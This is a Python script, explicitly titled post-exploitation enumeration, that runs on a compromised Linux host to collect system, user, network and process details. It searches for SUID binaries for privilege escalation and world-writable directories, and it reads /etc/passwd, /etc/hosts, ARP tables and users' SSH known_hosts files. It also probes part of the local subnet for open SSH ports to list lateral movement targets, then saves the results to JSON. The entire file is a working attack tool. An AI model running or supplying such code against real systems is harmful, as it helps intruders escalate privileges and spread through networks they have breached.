#!/usr/bin/env python3
"""Post-exploitation enumeration using only Python stdlib.
Gathers system info, users, network, processes, and finds lateral movement targets."""
import os
import sys
import socket
import subprocess
import json
import platform
import argparse
from pathlib import Path

def run_cmd(cmd, timeout=5):
    """Run a shell command and return output."""
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        return result.stdout.strip()
    except Exception:
        return ''

def get_system_info():
    """Gather basic system information."""
    return {
        'hostname': socket.gethostname(),
        'platform': platform.platform(),
        'arch': platform.machine(),
        'python': platform.python_version(),
        'user': run_cmd('whoami'),
        'uid': run_cmd('id'),
        'uptime': run_cmd('uptime'),
        'kernel': run_cmd('uname -r'),
    }

def get_network_info():
    """Gather network configuration."""
    return {
        'interfaces': run_cmd('ip addr 2>/dev/null || ifconfig 2>/dev/null'),
        'routes': run_cmd('ip route 2>/dev/null || route -n 2>/dev/null'),
        'dns': run_cmd('cat /etc/resolv.conf 2>/dev/null'),
        'connections': run_cmd('ss -tuln 2>/dev/null || netstat -tuln 2>/dev/null'),
        'arp': run_cmd('ip neigh 2>/dev/null || arp -a 2>/dev/null'),
    }

def get_users():
    """Enumerate users and groups."""
    users = []
    try:
        with open('/etc/passwd') as f:
            for line in f:
                parts = line.strip().split(':')
                if len(parts) >= 7:
                    uid = int(parts[2])
                    if uid >= 1000 or uid == 0:
                        users.append({'user': parts[0], 'uid': uid, 'home': parts[5], 'shell': parts[6]})
    except Exception:
        users = [{'raw': run_cmd('cat /etc/passwd | grep -E "(bash|sh|zsh)$"')}]
    sudo_users = run_cmd('grep -E "^sudo|^wheel|^admin" /etc/group 2>/dev/null')
    return {'users': users, 'sudo_group': sudo_users}

def get_processes():
    """List running processes."""
    return run_cmd('ps aux --sort=-%mem 2>/dev/null | head -20')

def find_suid_binaries():
    """Find SUID binaries for privilege escalation."""
    return run_cmd('find / -perm -4000 -type f 2>/dev/null | head -20')

def find_writable_dirs():
    """Find world-writable directories."""
    return run_cmd('find / -writable -type d 2>/dev/null | head -20')

def find_lateral_targets():
    """Find potential lateral movement targets."""
    targets = []
    # /etc/hosts — often lists internal hosts
    try:
        with open('/etc/hosts') as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#'):
                    parts = line.split()
                    if len(parts) >= 2:
                        ip = parts[0]
                        hostname = parts[1]
                        if not ip.startswith('127.') and not ip.startswith('::') and not ip.startswith('ff'):
                            targets.append(ip)
                            print(f'  [hosts] {ip} ({hostname})')
    except Exception:
        pass
    # Quick subnet probe (check .101-.110 for SSH on port 22)
    import socket
    my_ip = run_cmd("hostname -I 2>/dev/null").split()[0] if run_cmd("hostname -I 2>/dev/null") else ''
    if my_ip:
        subnet = '.'.join(my_ip.split('.')[:3])
        for last in range(101, 111):
            probe_ip = f'{subnet}.{last}'
            if probe_ip != my_ip:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(0.5)
                    if s.connect_ex((probe_ip, 22)) == 0:
                        targets.append(probe_ip)
                        print(f'  [subnet] {probe_ip} (SSH open)')
                    s.close()
                except Exception:
                    pass
    # SSH known hosts
    for user_home in Path('/home').iterdir() if Path('/home').exists() else []:
        kh = user_home / '.ssh' / 'known_hosts'
        if kh.exists():
            try:
                hosts = kh.read_text().splitlines()
                for h in hosts:
                    if h and not h.startswith('#'):
                        host = h.split()[0].split(',')[0]
                        if host not in targets:
                            targets.append(host)
            except Exception:
                pass
    # ARP neighbors
    arp = run_cmd('ip neigh 2>/dev/null || arp -a 2>/dev/null')
    for line in arp.splitlines():
        parts = line.split()
        if parts:
            ip = parts[0].strip('()')
            if ip not in targets and not ip.startswith('?'):
                targets.append(ip)
    return targets

def main():
    parser = argparse.ArgumentParser(description='Post-Exploitation Enumeration (stdlib)')
    parser.add_argument('-o', '--output', default=None, help='JSON output file')
    args = parser.parse_args()
    print('[*] Post-Exploitation Enumeration')
    results = {}
    print('[*] System info...')
    results['system'] = get_system_info()
    print(f'  Host: {results["system"]["hostname"]}')
    print(f'  User: {results["system"]["user"]}')
    print(f'  UID: {results["system"]["uid"]}')
    print('[*] Network info...')
    results['network'] = get_network_info()
    print('[*] Users...')
    results['users'] = get_users()
    print(f'  Found {len(results["users"]["users"])} users')
    print('[*] Processes...')
    results['processes'] = get_processes()
    print('[*] SUID binaries...')
    results['suid'] = find_suid_binaries()
    suid_count = len(results['suid'].splitlines()) if results['suid'] else 0
    print(f'  Found {suid_count} SUID binaries')
    print('[*] Lateral movement targets...')
    results['lateral_targets'] = find_lateral_targets()
    print(f'  Found {len(results["lateral_targets"])} potential targets')
    for t in results['lateral_targets']:
        print(f'    → {t}')
    if args.output:
        with open(args.output, 'w') as f:
            json.dump(results, f, indent=2, default=str)
        print(f'[*] Saved to {args.output}')

if __name__ == '__main__':
    main()
